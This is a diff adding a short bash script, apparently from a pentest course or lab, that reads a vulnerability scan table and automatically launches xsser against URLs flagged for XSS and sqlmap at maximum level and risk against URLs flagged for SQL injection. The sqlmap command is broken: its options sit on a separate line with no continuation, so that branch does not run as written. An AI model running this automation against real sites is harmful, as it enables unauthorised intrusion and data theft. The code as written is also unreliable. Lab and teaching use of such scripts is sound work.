@@ -1,0 +1,18 @@
+#M3: Exploração de vulnerabilidades
+
+tail -n +4 scan.md | grep -v '^\+' | while read line; do
+    table=$(echo $line |cut -d'|' -f4)
+    url=$(echo $line |cut -d'|' -f5)
+    if [[ table -eq 79 ]]; then
+        url=$(echo $url | cut -d'=' -f1)
+        echo "XSS in URL: $url"
+        python2 /home/tester/tut/xsser/xsser/xsser  -u "$url"
+    fi
+	 
+    if [[ table -eq 89 ]]; then
+        url=$(echo $url | cut -d'=' -f1)"=*"
+        echo "SQLI in URL: $url"
+        python3 /home/tester/tut/sqlmap-dev/sqlmap.py 
+        --level=5 --risk=3 -u "$url" --batch
+    fi
+done 
